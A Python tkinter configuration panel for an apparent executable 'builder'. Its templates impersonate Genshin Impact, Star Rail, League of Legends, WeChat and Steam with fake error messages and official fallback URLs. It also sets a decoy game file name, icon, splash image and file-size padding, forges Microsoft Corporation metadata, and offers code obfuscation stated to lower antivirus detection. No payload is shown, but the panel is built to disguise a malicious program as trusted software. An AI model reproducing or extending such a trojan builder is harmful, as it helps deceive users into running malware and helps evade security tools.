# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import filedialog, ttk
import os

try:
    from builder.locale.i18n import t
except ImportError:
    from locale.i18n import t  # type: ignore


class ConfigPanel(ttk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.pack(fill=tk.BOTH, expand=True)
        self._init_templates()
        self._setup_ui()

    def _init_templates(self):
        self.templates = {
            "原神 (Genshin Impact)": {
                "target_exe": "YuanShen.exe",
                "target_name": "原神",
                "fallback_url": "https://ys.mihoyo.com",
                "error_message": "无法定位程序输入点于动态链接库 Kernel32.dll。",
                "window_title": "正在加载游戏资源..."
            },
            "崩坏：星穹铁道 (Honkai: Star Rail)": {
                "target_exe": "StarRail.exe",
                "target_name": "崩坏：星穹铁道",
                "fallback_url": "https://sr.mihoyo.com",
                "error_message": "发生严重错误，驱动加载超时 (0x0000007b)",
                "window_title": "星穹列车连接中..."
            },
            "英雄联盟 (League of Legends)": {
                "target_exe": "LeagueClient.exe",
                "target_name": "英雄联盟",
                "fallback_url": "https://lol.qq.com",
                "error_message": "A critical component failed to initialize.",
                "window_title": "Riot Client / League of Legends"
            },
            "微信 (WeChat)": {
                "target_exe": "WeChat.exe",
                "target_name": "微信",
                "fallback_url": "https://weixin.qq.com",
                "error_message": "WeChatUpdate.exe 丢失，无法启动。",
                "window_title": "加载本地聊天记录..."
            },
            "Steam Client": {
                "target_exe": "steam.exe",
                "target_name": "Steam",
                "fallback_url": "https://store.steampowered.com",
                "error_message": "Fatal Error: Steam needs to be online to update.",
                "window_title": "Updating Steam..."
            }
        }

    def _create_section(self, title):
        frame = ttk.LabelFrame(self, text=title, padding="10")
        frame.pack(fill='x', pady=5)
        return frame

    def _create_entry(self, parent, label_text, default_value, **kwargs):
        frame = ttk.Frame(parent)
        frame.pack(fill='x', pady=3)
        ttk.Label(frame, text=label_text, width=24).pack(side='left')
        entry = ttk.Entry(frame, **kwargs)
        entry.insert(0, default_value)
        entry.pack(side='left', fill='x', expand=True)
        return entry

    def _setup_ui(self):
        # 0. 快速模板选择
        tpl_frame = ttk.Frame(self)
        tpl_frame.pack(fill='x', pady=5)
        ttk.Label(tpl_frame, text=t("lbl_template")).pack(side='left')
        self.template_combo = ttk.Combobox(tpl_frame, state='readonly', values=list(self.templates.keys()))
        self.template_combo.set(t("lbl_select_template"))
        self.template_combo.pack(side='left', fill='x', expand=True, padx=5)
        self.template_combo.bind("<<ComboboxSelected>>", self._on_template_selected)

        # 1. 目标程序设置
        target_frame = self._create_section(t("sec_target"))
        self.target_exe = self._create_entry(target_frame, t("lbl_target_exe"), "YuanShen.exe")
        self.target_name = self._create_entry(target_frame, t("lbl_target_name"), "原神")
        self.fallback_url = self._create_entry(target_frame, t("lbl_fallback_url"), "https://ys.mihoyo.com")
        self.error_message = self._create_entry(target_frame, t("lbl_error_msg"),
                                               "无法定位程序输入点于动态链接库 Kernel32.dll。")

        # 2. 伪装设置
        disguise_frame = self._create_section(t("sec_disguise"))
        self.output_name = self._create_entry(disguise_frame, t("lbl_output_name"), "植物大战僵尸3.exe")
        self.window_title = self._create_entry(disguise_frame, t("lbl_window_title"), "正在加载游戏资源...")

        # 图标选择
        icon_f = ttk.Frame(disguise_frame)
        icon_f.pack(fill='x', pady=5)
        ttk.Label(icon_f, text=t("lbl_icon_path"), width=24).pack(side='left')
        self.icon_path_var = tk.StringVar()
        ttk.Entry(icon_f, textvariable=self.icon_path_var).pack(side='left', fill='x', expand=True, padx=5)
        ttk.Button(icon_f, text="浏览...", command=self._browse_icon).pack(side='left')

        # Splash 图像选择 (新增)
        splash_f = ttk.Frame(disguise_frame)
        splash_f.pack(fill='x', pady=5)
        ttk.Label(splash_f, text="启动图 (.png/.gif可选):", width=24).pack(side='left')
        self.splash_path_var = tk.StringVar()
        ttk.Entry(splash_f, textvariable=self.splash_path_var).pack(side='left', fill='x', expand=True, padx=5)
        ttk.Button(splash_f, text="浏览...", command=self._browse_splash).pack(side='left')

        # 文件膨胀
        size_f = ttk.Frame(disguise_frame)
        size_f.pack(fill='x', pady=5)
        ttk.Label(size_f, text="目标文件大小 (MB):", width=24).pack(side='left')
        self.target_size_var = tk.StringVar(value="10")
        ttk.Entry(size_f, textvariable=self.target_size_var, width=10).pack(side='left', padx=5)
        ttk.Label(size_f, text="(0 表示不膨胀)").pack(side='left')

        # 3. 元数据伪装
        meta_frame = self._create_section("元数据伪装 (高级)")
        self.meta_company = self._create_entry(meta_frame, "公司名称:", "Microsoft Corporation")
        self.meta_desc = self._create_entry(meta_frame, "文件描述:", "Game Client")
        self.meta_copyright = self._create_entry(meta_frame, "版权信息:", "© Microsoft Corporation. All rights reserved.")
        self.meta_version = self._create_entry(meta_frame, "版本号 (X.X.X.X):", "1.0.0.1")

        # 4. 安全选项
        sec_frame = self._create_section("安全选项")
        self.enable_obfuscation_var = tk.BooleanVar(value=False)
        obf_cb = ttk.Checkbutton(
            sec_frame,
            text="启用代码混淆 （随机化变量名 + 插入垃圾代码，降低杀软识别率）",
            variable=self.enable_obfuscation_var
        )
        obf_cb.pack(anchor='w', pady=4)

    def _on_template_selected(self, event):
        selected = self.template_combo.get()
        if selected in self.templates:
            tpl = self.templates[selected]
            self.set_config(tpl)

    def _browse_icon(self):
        path = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico"), ("All Files", "*.*")])
        if path:
            self.icon_path_var.set(path)

    def _browse_splash(self):
        path = filedialog.askopenfilename(filetypes=[("Image Files", "*.png;*.gif"), ("All Files", "*.*")])
        if path:
            self.splash_path_var.set(path)

    def get_config(self) -> dict:
        """获取所有配置数据"""
        # Read splash image into Base64
        splash_data = ""
        splash_p = self.splash_path_var.get().strip()
        if splash_p and __import__("os").path.exists(splash_p):
            try:
                import base64
                with open(splash_p, "rb") as bf:
                    splash_data = base64.b64encode(bf.read()).decode("utf-8")
            except Exception:
                pass # Ignore error

        return {
            "target_exe": self.target_exe.get().strip(),
            "target_name": self.target_name.get().strip(),
            "fallback_url": self.fallback_url.get().strip(),
            "error_message": self.error_message.get().strip(),
            "output_name": self.output_name.get().strip(),
            "window_title": self.window_title.get().strip(),
            "icon_path": self.icon_path_var.get().strip(),
            "splash_path": splash_p,  # just for history saving
            "splash_image_data": splash_data,
            "target_size_mb": float(self.target_size_var.get() or 0),
            "meta_company": self.meta_company.get().strip(),
            "meta_desc": self.meta_desc.get().strip(),
            "meta_copyright": self.meta_copyright.get().strip(),
            "meta_version": self.meta_version.get().strip(),
            "enable_obfuscation": self.enable_obfuscation_var.get(),
        }

    def set_config(self, cfg: dict):
        """加载历史配置数据"""
        if not cfg:
            return

        for k, v in cfg.items():
            if k == "target_size_mb":
                self.target_size_var.set(str(v))
            elif k == "icon_path":
                self.icon_path_var.set(v)
            elif k == "splash_path":
                self.splash_path_var.set(v)
            elif k == "enable_obfuscation":
                self.enable_obfuscation_var.set(bool(v))
            elif hasattr(self, k) and isinstance(getattr(self, k), ttk.Entry):
                entry = getattr(self, k)
                entry.delete(0, tk.END)
                entry.insert(0, str(v))
